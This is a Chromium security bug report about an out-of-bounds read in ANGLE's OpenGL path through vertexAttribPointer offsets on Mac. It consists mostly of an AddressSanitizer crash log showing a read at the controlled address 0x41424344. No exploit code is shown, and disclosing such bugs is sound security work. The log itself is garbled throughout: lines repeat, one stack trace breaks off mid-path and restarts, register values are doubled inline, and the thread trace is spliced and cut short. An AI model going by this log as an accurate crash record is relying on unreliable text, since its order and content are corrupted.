# Security: [ANGLE] opengl : Out-of-bounds memory can be accessed using offsets in vertexAttribPointer

| Field | Value |
|-------|-------|
| **Issue ID** | [40066076](https://issues.chromium.org/issues/40066076) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>WebGL, Internals>GPU>ANGLE |
| **Platforms** | Mac |
| **Reporter** | ne...@nesk.kr |
| **Assignee** | ge...@chromium.org |
| **Created** | 2023-06-20 |
| **Bounty** | $10,000.00 |

## Description

**VULNERABILITY DETAILS**

# AddressSanitizer:DEADLYSIGNAL

==7974==ERROR: AddressSanitizer: SEGV on unknown address 0x000041424344 (pc 0x00020d105c2c bp 0x00028c1c4e00 sp 0x00028c1c4c50 T25)  

==7974==ERROR: AddressSanitizer: SEGV on unknown address 0x000041424344 (pc 0x00020d105c2c bp 0x00028c1c4e00 sp 0x00028c1c4c50 T25)  

==7974==The signal is caused by a READ memory access.  

==7974==The signal is caused by a READ memory access.  

==7974==WARNING: invalid path to external symbolizer!  

==7974==WARNING: invalid path to external symbolizer!  

==7974==WARNING: Failed to use and restart external symbolizer!  

==7974==WARNING: Failed to use and restart external symbolizer!  

#0 0x20d105c2c in gleRunVertexSubmitImmediate+0xb48 (/System/Library/Frameworks/OpenGL.framework/Versions/A/Resources/GLEngine.bundle/GLEngine:arm64+0x12cc2c) (BuildId: 07f4fb2fb29a3ae29179e379a4ac0d1a32000000200000000100000000040d00)  

#1 0x8b4a80020d094b88 (<unknown module>)  

#2 0x6e33000295f60250 (<unknown module>)  

#3 0x295821a94 in GL\_DrawArrays+0x41c (/Users/nesk/chromium/src/out/AsanRelease/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/116.0.5840.0/Libraries/libGLESv2.dylib:arm64+0x31a94) (BuildId: 4c4c446f55553144a1accd4debf6e07b32000000200000000100000000000b00)  

#4 0x10b232114 in gl::RealGLApi::glDrawArraysFn(unsigned int, int, int)+0x1a8 (/Users/nesk/chromium/src/out/AsanRelease/libgl\_wrapper.dylib:arm64+0x92114) (BuildId: 4c4c441755553144a18899e32a9590ef32000000200000000100000000000b00)  

#5 0x13d8460a8 in gpu::gles2::GLES2DecoderPassthroughImpl::DoDrawArrays(unsigned int, int, int)+0x4c (/Users/nesk/chromium/src/out/AsanRelease/libgpu\_gles2.dylib:arm64+0xd60a8) (BuildId: 4c4c447f55553144a182475a1f98430032000000200000000100000000000b00)  

#6 0x13d8119ec in gpu::error::Error gpu::gles2::GLES2DecoderPassthroughImpl::DoCommandsImpl<false>(unsigned int, void const volatile\*, int, int\*)+0x1b4 (/Users/nesk/chromium/src/out/AsanRelease/libgpu\_gles2.dylib:arm64+0xa19ec) (BuildId: 4c4c447f55553144a182475a1f98430032000000200000000100000000000b00)  

#7 0x108cca9c8 in gpu::CommandBufferService::Flush(int, gpu::AsyncAPIInterface\*)+0x490 (/Users/nesk/chromium/src/out/AsanRelease/libgpu.dylib:arm64+0x4e9c8) (BuildId: 4c4c442655553144a162b1ca7c9d0b6f32000000200000000100000000000b00)  

#8 0x13a1a1d54 in gpu::CommandBufferStub::OnAsyncFlush(int, unsigned int, std::\_\_Cr::vector<gpu::SyncToken, std::\_\_Cr::allocator[gpu::SyncToken](javascript:void(0);)> const&)+0x2a0 (/Users/nesk/chromium/src/out/AsanRelease/libgpu\_ipc\_service.dylib:arm64+0x5d54) (BuildId: 4c4c442e55553144a122eb630926bb3f32000000200000000100000000000b00)  

#9 0x13a1a0c44 in gpu::CommandBufferStub::ExecuteDeferredRequest(gpu::mojom::DeferredCommandBufferRequestParams&)+0x1cc (/Users/nesk/chromium/src/out/AsanRelease/libgpu\_ipc\_service.dylib:arm64+0x4c44) (BuildId: 4c4c442e55553144a122eb630926bb3f32000000200000000100000000000b00)  

#10 0x13a1bae28 in gpu::GpuChannel::ExecuteDeferredRequest(mojo::StructPtr[gpu::mojom::DeferredRequestParams](javascript:void(0);))+0x3d0 (/Users/nesk/chromium/src/out/AsanRelease/libgpu\_ipc\_service.dylib:arm64+0x1ee28) (BuildId: 4c4c442e55553144a122eb630926bb3f32000000200000000100000000000b00)  

#11 0x13a1ca704 in void base::internal::FunctorTraits<void (gpu::GpuChannel::\*)(mojo::StructPtr[gpu::mojom::DeferredRequestParams](javascript:void(0);)), void>::Invoke<void (gpu::GpuChannel::\*)(mojo::StructPtr[gpu::mojom::DeferredRequestParams](javascript:void(0);)), base::WeakPtr[gpu::GpuChannel](javascript:void(0);) const&, mojo::StructPtr[gpu::mojom::DeferredRequestParams](javascript:void(0);)>(void (gpu::GpuChannel::\*)(mojo::StructPtr[gpu::mojom::DeferredRequestParams](javascript:void(0);)), base::WeakPtr[gpu::GpuChannel](javascript:void(0);) const&, mojo::StructPtr[gpu::mojom::DeferredRequestParams](javascript:void(0);)&&)+0x14c (/Users/nesk/chromium/src/out/AsanRelease/libgpu\_ipc\_service.dylib:arm64+0x2e704) (BuildId: 4c4c442e55553144a122eb630926bb3f32000000200000000100000000000b00)  

#12 0x108cfbf98 in gpu::SchedulerDfs::ExecuteSequence(base::IdType<gpu::SyncPointOrderData, unsigned int, 0u, 1u>)+0x720 (/Users/nesk/chromium/src/out/AsanRelease/libgpu.dylib:arm64+0x7ff98) (BuildId: 4c4c442655553144a162b1ca7c9d0b6f32000000200000000100000000000b00)  

#13 0x108cfa3d4 in gpu::SchedulerDfs::RunNextTask()+0x170 (/Users/nesk/chromium/src/out/AsanRelease/libgpu.dylib:arm64+0x7e3d4) (BuildId: 4c4c442655553144a162b1ca7c9d0b6f32000000200000000100000000000b00)  

#14 0x104a4f9dc in base::TaskAnnotator::RunTaskImpl(base::PendingTask&)+0x398 (/Users/nesk/chromium/src/out/AsanRelease/libbase.dylib:arm64+0x1bf9dc) (BuildId: 4c4c448c55553144a1424687edb82ede32000000200000000100000000000b00)  

#15 0x104aa8f90 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow\*)+0x7a8 (/Users/nesk/chromium/src/ #0 0x20d105c2c in gleRunVertexSubmitImmediate+0xb48 (/System/Library/Frameworks/OpenGL.framework/Versions/A/Resources/GLEngine.bundle/GLEngine:arm64+0x12cc2c) (BuildId: 07f4fb2fb29a3ae29179e379a4ac0d1a32000000200000000100000000040d00)  

#1 0x8b4a80020d094b88 (<unknown module>)  

#2 0x6e33000295f60250 (<unknown module>)  

#3 0x295821a94 in GL\_DrawArrays+0x41c (/Users/nesk/chromium/src/out/AsanRelease/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/116.0.5840.0/Libraries/libGLESv2.dylib:arm64+0x31a94) (BuildId: 4c4c446f55553144a1accd4debf6e07b32000000200000000100000000000b00)  

#4 0x10b232114 in gl::RealGLApi::glDrawArraysFn(unsigned int, int, int)+0x1a8 (/Users/nesk/chromium/src/out/AsanRelease/libgl\_wrapper.dylib:arm64+0x92114) (BuildId: 4c4c441755553144a18899e32a9590ef32000000200000000100000000000b00)  

#5 0x13d8460a8 in gpu::gles2::GLES2DecoderPassthroughImpl::DoDrawArrays(unsigned int, int, int)+0x4c (/Users/nesk/chromium/src/out/AsanRelease/libgpu\_gles2.dylib:arm64+0xd60a8) (BuildId: 4c4c447f55553144a182475a1f98430032000000200000000100000000000b00)  

#6 0x13d8119ec in gpu::error::Error gpu::gles2::GLES2DecoderPassthroughImpl::DoCommandsImpl<false>(unsigned int, void const volatile\*, int, int\*)+0x1b4 (/Users/nesk/chromium/src/out/AsanRelease/libgpu\_gles2.dylib:arm64+0xa19ec) (BuildId: 4c4c447f55553144a182475a1f98430032000000200000000100000000000b00)  

#7 0x108cca9c8 in gpu::CommandBufferService::Flush(int, gpu::AsyncAPIInterface\*)+0x490 (/Users/nesk/chromium/src/out/AsanRelease/libgpu.dylib:arm64+0x4e9c8) (BuildId: 4c4c442655553144a162b1ca7c9d0b6f32000000200000000100000000000b00)  

#8 0x13a1a1d54 in gpu::CommandBufferStub::OnAsyncFlush(int, unsigned int, std::\_\_Cr::vector<gpu::SyncToken, std::\_\_Cr::allocator[gpu::SyncToken](javascript:void(0);)> const&)+0x2a0 (/Users/nesk/chromium/src/out/AsanRelease/libgpu\_ipc\_service.dylib:arm64+0x5d54) (BuildId: 4c4c442e55553144a122eb630926bb3f32000000200000000100000000000b00)  

#9 0x13a1a0c44 in gpu::CommandBufferStub::ExecuteDeferredRequest(gpu::mojom::DeferredCommandBufferRequestParams&)+0x1cc (/Users/nesk/chromium/src/out/AsanRelease/libgpu\_ipc\_service.dylib:arm64+0x4c44) (BuildId: 4c4c442e55553144a122eb630926bb3f32000000200000000100000000000b00)  

#10 0x13a1bae28 in gpu::GpuChannel::ExecuteDeferredRequest(mojo::StructPtr[gpu::mojom::DeferredRequestParams](javascript:void(0);))+0x3d0 (/Users/nesk/chromium/src/out/AsanRelease/libgpu\_ipc\_service.dylib:arm64+0x1ee28) (BuildId: 4c4c442e55553144a122eb630926bb3f32000000200000000100000000000b00)  

#11 0x13a1ca704 in void base::internal::FunctorTraits<void (gpu::GpuChannel::\*)(mojo::StructPtr[gpu::mojom::DeferredRequestParams](javascript:void(0);)), void>::Invoke<void (gpu::GpuChannel::\*)(mojo::StructPtr[gpu::mojom::DeferredRequestParams](javascript:void(0);)), base::WeakPtr[gpu::GpuChannel](javascript:void(0);) const&, mojo::StructPtr[gpu::mojom::DeferredRequestParams](javascript:void(0);)>(void (gpu::GpuChannel::\*)(mojo::StructPtr[gpu::mojom::DeferredRequestParams](javascript:void(0);)), base::WeakPtr[gpu::GpuChannel](javascript:void(0);) const&, mojo::StructPtr[gpu::mojom::DeferredRequestParams](javascript:void(0);)&&)+0x14c (/Users/nesk/chromium/src/out/AsanRelease/libgpu\_ipc\_service.dylib:arm64+0x2e704) (BuildId: 4c4c442e55553144a122eb630926bb3f32000000200000000100000000000b00)  

#12 0x108cfbf98 in gpu::SchedulerDfs::ExecuteSequence(base::IdType<gpu::SyncPointOrderData, unsigned int, 0u, 1u>)+0x720 (/Users/nesk/chromium/src/out/AsanRelease/libgpu.dylib:arm64+0x7ff98) (BuildId: 4c4c442655553144a162b1ca7c9d0b6f32000000200000000100000000000b00)  

#13 0x108cfa3d4 in gpu::SchedulerDfs::RunNextTask()+0x170 (/Users/nesk/chromium/src/out/AsanRelease/libgpu.dylib:arm64+0x7e3d4) (BuildId: 4c4c442655553144a162b1ca7c9d0b6f32000000200000000100000000000b00)  

#14 0x104a4f9dc in base::TaskAnnotator::RunTaskImpl(base::PendingTask&)+0x398 (/Users/nesk/chromium/src/out/AsanRelease/libbase.dylib:arm64+0x1bf9dc) (BuildId: 4c4c448c55553144a1424687edb82ede32000000200000000100000000000b00)  

#15 0x104aa8f90 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow\*)+0x7a8 (/Users/nesk/chromium/src/out/AsanRelease/libbase.dylib:arm64+0x218f90) (BuildId: 4c4c448c55553144a1424687edb82ede32000000200000000100000000000b00)  

#16 0x104aa8408 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()+0x130 (/Users/nesk/chromium/src/out/AsanRelease/libbase.dylib:arm64+0x218408) (BuildId: 4c4c448c55553144a1424687edb82ede32000000200000000100000000000b00)  

#17 0x104cb7568 in base::MessagePumpCFRunLoopBase::RunWork()+0x1d4 (/Users/nesk/chromium/src/out/AsanRelease/libbase.dylib:arm64+0x427568) (BuildId: 4c4c448c55553144a1424687edb82ede32000000200000000100000000000b00)  

#18 0x104c22cbc in base::mac::CallWithEHFrame(void () block\_pointer)+0xc (/Users/nesk/chromium/src/out/AsanRelease/libbase.dylib:arm64+0x392cbc) (BuildId: 4c4c448c55553144a1424687edb82ede32000000200000000100000000000b00)  

#19 0x104cb5490 in base::MessagePumpCFRunLoopBase::RunWorkSource(void\*)+0x13c (/Users/nesk/chromium/src/out/AsanRelease/libbase.dylib:arm64+0x425490) (BuildId: 4c4c448c55553144a1424687edb82ede32000000200000000100000000000b00)  

#20 0x1a8346638 in **CFRUNLOOP\_IS\_CALLING\_OUT\_TO\_A\_SOURCE0\_PERFORM\_FUNCTION**+0x18 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64+0x7f638) (BuildId: 203e44018c2e3157a24b92f52551d43e32000000200000000100000000040d00)  

#21 0x6a448001a83465cc (<unknown module>)  

#22 0x1d460001a834633c (<unknown module>)  

#23 0xf4100001a8344f44 (<unknown module>)  

#24 0xab250001a83444b4 (<unknown module>)  

#25 0x80368001a92bdfc8 (<unknown module>)  

#26 0x8278800104cb90bc (<unknown module>)  

#27 0x104cb4030 in base::MessagePumpCFRunLoopBase::Run(base::MessagePump::Delegate\*)+0x23c (/Users/nesk/chromium/src/out/AsanRelease/libbase.dylib:arm64+0x424030) (BuildId: 4c4c448c55553144a1424687edb82ede32000000200000000100000000000b00)  

#28 0x104aaab0c in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta)+0x354 (/Users/nesk/chromium/src/out/AsanRelease/libbase.dylib:arm64+0x21ab0c) (BuildId: 4c4c448c55553144a1424687edb82ede32000000200000000100000000000b00)  

#29 0x1049c2f8c in base::RunLoop::Run(base::Location const&)+0x430 (/Users/nesk/chromium/src/out/AsanRelease/libbase.dylib:arm64+0x132f8c) (BuildId: 4c4c448c55553144a1424687edb82ede32000000200000000100000000000b00)  

#30 0x104b334c0 in base::Thread::Run(base::RunLoop\*)+0xdc (/Users/nesk/chromium/src/out/AsanRelease/libbase.dylib:arm64+0x2a34c0) (BuildId: 4c4c448c55553144a1424687edb82ede32000000200000000100000000000b00)  

#31 0x104b33910 in base::Thread::ThreadMain()+0x3c8 (/Users/nesk/chromium/src/out/AsanRelease/libbase.dylib:arm64+0x2a3910) (BuildId: 4c4c448c55553144a1424687edb82ede32000000200000000100000000000b00)  

#32 0x104b92fac in base::(anonymous namespace)::ThreadFunc(void\*)+0xe0 (/Users/nesk/chromium/src/out/AsanRelease/libbase.dylib:arm64+0x302fac) (BuildId: 4c4c448c55553144a1424687edb82ede32000000200000000100000000000b00)  

#33 0x1034656e4 in \_\_sanitizer\_weak\_hook\_memcmp+0x349c8 (/Users/nesk/chromium/src/out/AsanRelease/Chromium.app/Contents/MacOS/libclang\_rt.asan\_osx\_dynamic.dylib:arm64+0x4d6e4) (BuildId: 4c4c443e55553144a1400716444dd55532000000200000000100000000000b00)  

#34 0x1a8267fa4 in \_pthread\_start+0x90 (/usr/lib/system/libsystem\_pthread.dylib:arm64+0x6fa4) (BuildId: 46d35233a0513f4fbba4ba56dddc4d1a32000000200000000100000000040d00)  

#35 0x2a140001a8262d9c (<unknown module>)

==7974==Register values:  

out/AsanRelease/libbase.dylib:arm64+0x218f90) (BuildId: 4c4c448c55553144a1424687edb82ede32000000200000000100000000000b00)  

#16 0x104aa8408 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()+0x130 (/Users/nesk/chromium/src/out/AsanRelease/libbase.dylib:arm64+0x218408) (BuildId: 4c4c448c55553144a1424687edb82ede32000000200000000100000000000b00)  

#17 0x104cb7568 in base::MessagePumpCFRunLoopBase::RunWork()+0x1d4 (/Users/nesk/chromium/src/out/AsanRelease/libbase.dylib:arm64+0x427568) (BuildId: 4c4c448c55553144a1424687edb82ede32000000200000000100000000000b00)  

#18 0x104c22cbc in base::mac::CallWithEHFrame(void () block\_pointer)+0xc (/Users/nesk/chromium/src/out/AsanRelease/libbase.dylib:arm64+0x392cbc) (BuildId: 4c4c448c55553144a1424687edb82ede32000000200000000100000000000b00)  

#19 0x104cb5490 in base::MessagePumpCFRunLoopBase::RunWorkSource(void\*)+0x13c (/Users/nesk/chromium/src/out/AsanRelease/libbase.dylib:arm64+0x425490) (BuildId: 4c4c448c55553144a1424687edb82ede32000000200000000100000000000b00)  

#20 0x1a8346638 in **CFRUNLOOP\_IS\_CALLING\_OUT\_TO\_A\_SOURCE0\_PERFORM\_FUNCTION**+0x18 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64+0x7f638) (BuildId: 203e44018c2e3157a24b92f52551d43e32000000200000000100000000040d00)  

#21 0x6a448001a83465cc (<unknown module>)  

#22 0x1d460001a834633c (<unknown module>)  

#23 0xf4100001a8344f44 (<unknown module>)  

#24 0xab250001a83444b4 (<unknown module>)  

#25 0x80368001a92bdfc8 (<unknown module>)  

#26 0x8278800104cb90bc (<unknown module>)  

#27 0x104cb4030 in base::MessagePumpCFRunLoopBase::Run(base::MessagePump::Delegate\*)+0x23c (/Users/nesk/chromium/src/out/AsanRelease/libbase.dylib:arm64+0x424030) (BuildId: 4c4c448c55553144a1424687edb82ede32000000200000000100000000000b00)  

#28 0x104aaab0c in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta)+0x354 (/Users/nesk/chromium/src/out/AsanRelease/libbase.dylib:arm64+0x21ab0c) (BuildId: 4c4c448c55553144a1424687edb82ede32000000200000000100000000000b00)  

#29 0x1049c2f8c in base::RunLoop::Run(base::Location const&)+0x430 (/Users/nesk/chromium/src/out/AsanRelease/libbase.dylib:arm64+0x132f8c) (BuildId: 4c4c448c55553144a1424687edb82ede32000000200000000100000000000b00)  

#30 0x104b334c0 in base::Thread::Run(base::RunLoop\*)+0xdc (/Users/nesk/chromium/src/out/AsanRelease/libbase.dylib:arm64+0x2a34c0) (BuildId: 4c4c448c55553144a1424687edb82ede32000000200000000100000000000b00)  

#31 0x104b33910 in base::Thread::ThreadMain()+0x3c8 (/Users/nesk/chromium/src/out/AsanRelease/libbase.dylib:arm64+0x2a3910) (BuildId: 4c4c448c55553144a1424687edb82ede32000000200000000100000000000b00)  

#32 0x104b92fac in base::(anonymous namespace)::ThreadFunc(void\*)+0xe0 (/Users/nesk/chromium/src/out/AsanRelease/libbase.dylib:arm64+0x302fac) (BuildId: 4c4c448c55553144a1424687edb82ede32000000200000000100000000000b00)  

#33 0x1034656e4 in \_\_sanitizer\_weak\_hook\_memcmp+0x349c8 (/Users/nesk/chromium/src/out/AsanRelease/Chromium.app/Contents/MacOS/libclang\_rt.asan\_osx\_dynamic.dylib:arm64+0x4d6e4) (BuildId: 4c4c443e55553144a1400716444dd55532000000200000000100000000000b00)  

#34 0x1a8267fa4 in \_pthread\_start+0x90 (/usr/lib/system/libsystem\_pthread.dylib:arm64+0x6fa4) (BuildId: 46d35233a0513f4fbba4ba56dddc4d1a32000000200000000100000000040d00)  

#35 0x2a140001a8262d9c (<unknown module>)

==7974==Register values:  

x[0] = 0x0000630000000400 x[0] = 0x0000630000000400 x[1] = 0x0000000000000000 x[1] = 0x0000000000000000 x[2] = 0x0000000000000000 x[2] = 0x0000000000000000 x[3] = 0x0000000000000000 x[3] = 0x0000000000000000

x[4] = 0x0000000000000000 x[4] = 0x0000000000000000 x[5] = 0x00006100002a26f0 x[5] = 0x00006100002a26f0 x[6] = 0x000000028b9c8000 x[6] = 0x000000028b9c8000 x[7] = 0x0000000000000001 x[7] = 0x0000000000000001

x[8] = 0x0000000900040100 x[8] = 0x0000000900040100 x[9] = 0x0000000041424344 x[9] = 0x0000000041424344 x[10] = 0x0000001800010a01 x[10] = 0x0000001800010a01 x[11] = 0x0000000000000001 x[11] = 0x0000000000000001

x[12] = 0x0000000000000000 x[12] = 0x0000000000000000 x[13] = 0x000000a000000100 x[13] = 0x000000a000000100 x[14] = 0x00000000ffffffff x[14] = 0x00000000ffffffff x[15] = 0x0000000000000000 x[15] = 0x0000000000000000  

x[16] = 0x000000020d105c2c  

x[16] = 0x000000020d105c2c x[17] = 0x000000020d10585c x[17] = 0x000000020d10585c x[18] = 0x0000000000000000 x[18] = 0x0000000000000000 x[19] = 0x00006100002a26f0  

x[19] = 0x00006100002a26f0  

x[20] = 0x00006100002a26f8 x[20] = 0x00006100002a26f8 x[21] = 0x0000000000000001 x[21] = 0x0000000000000001 x[22] = 0x0000000900040100 x[22] = 0x0000000900040100 x[23] = 0x0000000000000001 x[23] = 0x0000000000000001

x[24] = 0x00000000fffffffe x[24] = 0x00000000fffffffe x[25] = 0x00000000ffffffff x[25] = 0x00000000ffffffff x[26] = 0x0000000000000000 x[26] = 0x0000000000000000 x[27] = 0x0000630000000400 x[27] = 0x0000630000000400

x[28] = 0x0000000000000001 x[28] = 0x0000000000000001 fp = 0x000000028c1c4e00 fp = 0x000000028c1c4e00 lr = 0x8b4a80020d094b8c lr = 0x8b4a80020d094b8c sp = 0x000000028c1c4c50 sp = 0x000000028c1c4c50

AddressSanitizer can not provide additional info.  

AddressSanitizer can not provide additional info.  

SUMMARY: AddressSanitizer: SEGV (/System/Library/Frameworks/OpenGL.framework/Versions/A/Resources/GLEngine.bundle/GLEngine:arm64+0x12cc2c) (BuildId: 07f4fb2fb29a3ae29179e379a4ac0d1a32000000200000000100000000040d00) in gleRunVertexSubmitImmediate+0xb48  

SUMMARY: AddressSanitizer: SEGV (/System/Library/Frameworks/OpenGL.framework/Versions/A/Resources/GLEngine.bundle/GLEngine:arm64+0x12cc2c) (BuildId: 07f4fb2fb29a3ae29179e379a4ac0d1a32000000200000000100000000040d00) in gleRunVertexSubmitImmediate+0xb48  

Thread T25 created by T0 here:  

Thread T25 created by T0 here:  

#0 0x1034607cc in \_\_sanitizer\_weak\_hook\_memcmp+0x2fab0 (/Users/nesk/chromium/src/out/AsanRelease/Chromium.app/Contents/MacOS/libclang\_rt.asan\_osx\_dynamic.dylib:arm64+0x487cc) (BuildId: 4c4c443e55553144a1400716444dd55532000000200000000100000000000b00)  

#1 0x104b924cc in base::(anonymous namespace)::CreateThread(unsigned long, bool, base::PlatformThread::Delegate\*, base::PlatformThreadHandle\*, base::ThreadType, base::MessagePumpType)+0x1d8 (/Users/nesk/chromium/src/out/AsanRelease/libbase.dylib:arm64+0x3024cc) (BuildId: 4c4c448c55553144a1424687edb82ede32000000200000000100000000000b00)  

#2 0x104b32200 in base::Thread::StartWithOptions(base::Thread::Options)+0x47c (/Users/nesk/chromium/src/out/AsanRelease/libbase.dylib:arm64+0x2a2200) (BuildId: 4c4c448c55553144a1424687edb82ede32000000200000000100000000000b00)  

#3 0x10fedfde0 in content::GpuProcessHost::Init()+0x44c (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0x1463de0) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#4 0x10fedf7dc in content::GpuProcessHost::Get(content::GpuProcessKind, bool)+0x140 (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0x14637dc) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#5 0x10feae204 in content::BrowserGpuChannelHostFactory::EstablishRequest::Establish(bool)+0xd8 (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0x1432204) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#6 0x10feadfec in content::BrowserGpuChannelHostFactory::EstablishRequest::Create(int, unsigned long long, bool, std::\_\_Cr::vector<base::OnceCallback<void (scoped\_refptr[gpu::GpuChannelHost](javascript:void(0);))>, std::\_\_Cr::allocator<base::OnceCallback<void (scoped\_refptr[gpu::GpuChannelHost](javascript:void(0);))>>>)+0x20c (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0x1431fec) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#7 0x10feb0df4 in content::BrowserGpuChannelHostFactory::EstablishGpuChannel(base::OnceCallback<void (scoped\_refptr[gpu::GpuChannelHost](javascript:void(0);))>, bool)+0x8e8 (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0x1434df4) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#8 0x10feb0450 in content::BrowserGpuChannelHostFactory::EstablishGpuChannel(base::OnceCallback<void (scoped\_refptr[gpu::GpuChannelHost](javascript:void(0);))>)+0x114 (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0x1434450) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#9 0x10feaf970 in content::BrowserGpuChannelHostFactory::Initialize(bool)+0x1f4 (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0x1433970) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#10 0x10f814d20 in content::BrowserMainLoop::PostCreateThreadsImpl()+0x32c (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0xd98d20) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#11 0x10f813ed0 in content::BrowserMainLoop::PostCreateThreads()+0xf0 (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0xd97ed0) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#12 0x110ea7920 in content::StartupTaskRunner::RunAllTasksNow()+0x148 (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0x242b920) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#13 0x10f8134ec in content::BrowserMainLoop::CreateStartupTasks()+0x6cc (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0xd974ec) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#14 0x10f81b6d8 in content::BrowserMainRunnerImpl::Initialize(content::MainFunctionParams)+0x158 (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0xd9f6d8) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#15 0x10f80fe58 in content::BrowserMain(content::MainFunctionPar #0 0x1034607cc in \_\_sanitizer\_weak\_hook\_memcmp+0x2fab0 (/Users/nesk/chromium/src/out/AsanRelease/Chromium.app/Contents/MacOS/libclang\_rt.asan\_osx\_dynamic.dylib:arm64+0x487cc) (BuildId: 4c4c443e55553144a1400716444dd55532000000200000000100000000000b00)  

#1 0x104b924cc in base::(anonymous namespace)::CreateThread(unsigned long, bool, base::PlatformThread::Delegate\*, base::PlatformThreadHandle\*, base::ThreadType, base::MessagePumpType)+0x1d8 (/Users/nesk/chromium/src/out/AsanRelease/libbase.dylib:arm64+0x3024cc) (BuildId: 4c4c448c55553144a1424687edb82ede32000000200000000100000000000b00)  

#2 0x104b32200 in base::Thread::StartWithOptions(base::Thread::Options)+0x47c (/Users/nesk/chromium/src/out/AsanRelease/libbase.dylib:arm64+0x2a2200) (BuildId: 4c4c448c55553144a1424687edb82ede32000000200000000100000000000b00)  

#3 0x10fedfde0 in content::GpuProcessHost::Init()+0x44c (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0x1463de0) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#4 0x10fedf7dc in content::GpuProcessHost::Get(content::GpuProcessKind, bool)+0x140 (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0x14637dc) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#5 0x10feae204 in content::BrowserGpuChannelHostFactory::EstablishRequest::Establish(bool)+0xd8 (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0x1432204) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#6 0x10feadfec in content::BrowserGpuChannelHostFactory::EstablishRequest::Create(int, unsigned long long, bool, std::\_\_Cr::vector<base::OnceCallback<void (scoped\_refptr[gpu::GpuChannelHost](javascript:void(0);))>, std::\_\_Cr::allocator<base::OnceCallback<void (scoped\_refptr[gpu::GpuChannelHost](javascript:void(0);))>>>)+0x20c (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0x1431fec) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#7 0x10feb0df4 in content::BrowserGpuChannelHostFactory::EstablishGpuChannel(base::OnceCallback<void (scoped\_refptr[gpu::GpuChannelHost](javascript:void(0);))>, bool)+0x8e8 (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0x1434df4) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#8 0x10feb0450 in content::BrowserGpuChannelHostFactory::EstablishGpuChannel(base::OnceCallback<void (scoped\_refptr[gpu::GpuChannelHost](javascript:void(0);))>)+0x114 (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0x1434450) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#9 0x10feaf970 in content::BrowserGpuChannelHostFactory::Initialize(bool)+0x1f4 (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0x1433970) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#10 0x10f814d20 in content::BrowserMainLoop::PostCreateThreadsImpl()+0x32c (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0xd98d20) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#11 0x10f813ed0 in content::BrowserMainLoop::PostCreateThreads()+0xf0 (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0xd97ed0) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

#12 0x110ea7920 in content::StartupTaskRunner::RunAllTasksNow()+0x148 (/Users/nesk/chromium/src/out/AsanRelease/libcontent.dylib:arm64+0x242b920) (BuildId: 4c4c449955553144a1480df8c17e1e1132000000200000000100000000000b00)  

